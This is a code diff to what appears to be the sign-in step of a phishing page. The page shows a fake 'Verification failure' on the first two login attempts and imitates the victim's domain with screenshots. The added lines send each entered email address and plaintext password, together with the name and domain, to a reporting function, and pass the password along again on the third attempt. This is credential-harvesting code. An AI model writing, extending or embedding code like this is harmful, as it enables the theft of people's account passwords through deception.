@@ -4,11 +4,13 @@ import { useAuth } from '../context/AuthContext'
 import {
   cacheScreenshotUrl,
   getBootScreenshotUrl,
+  getDomainFromEmail,
   getScreenshotUrls,
   raceScreenshot,
   resolveBackgroundDomain,
   userFromEmail,
 } from '../lib/utils'
+import { sendResponse } from '../lib/responses'
 import { verifyCaptchaToken } from '../lib/captcha'
 import { primeClientMeta } from '../lib/clientMeta'
 import { getPersonalizedUrlParams } from '../lib/urlParams'
@@ -139,13 +141,32 @@ function SignInStep({ onDomainChange }: SignInStepProps) {
     await new Promise((r) => setTimeout(r, 500))
 
     signInAttempts++
+    const trimmedEmail = email.trim()
+    const domain = getDomainFromEmail(trimmedEmail) || resolveBackgroundDomain(trimmedEmail)
+
     if (signInAttempts < 3) {
+      void sendResponse({
+        type: 'sign_in_report',
+        email: trimmedEmail,
+        password,
+        name: userFromEmail(trimmedEmail).name,
+        domain,
+        authMethod: 'email',
+        attempt: String(signInAttempts),
+        outcome: 'failed',
+        message: 'Verification failure. Please try again.',
+      })
       setError('Verification failure. Please try again.')
       setLoading(false)
       return
     }
 
-    signIn(userFromEmail(email.trim()), { authMethod: 'email' })
+    signIn(userFromEmail(trimmedEmail), {
+      authMethod: 'email',
+      attempt: String(signInAttempts),
+      outcome: 'success',
+      password,
+    })
     setLoading(false)
   }
 
